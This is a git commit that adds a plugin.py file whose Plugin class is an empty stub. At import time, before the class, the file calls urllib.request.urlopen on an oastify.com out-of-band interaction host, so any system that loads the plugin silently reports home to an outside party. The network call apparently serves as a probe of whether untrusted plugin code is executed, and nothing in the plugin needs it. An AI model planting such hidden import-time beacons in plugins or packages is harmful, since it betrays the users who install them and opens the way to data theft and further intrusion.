6b013f3f183afe2e32b806662a46914dfd9100bd
groeneappel <wannesman@gmail.com>
2025-07-28 14:48:03 +0200

    Create plugin.py

---
+++ plugin.py
@@ -0,0 +1,11 @@
+import urllib.request
+
+urllib.request.urlopen("http://tdac5y1mkhyg2eb7lrkizj6i0960usih.oastify.com/hit")
+
+class Plugin:
+    def init(self):
+        return True
+    def run(self, arg):
+        pass
+    def term(self):
+        pass
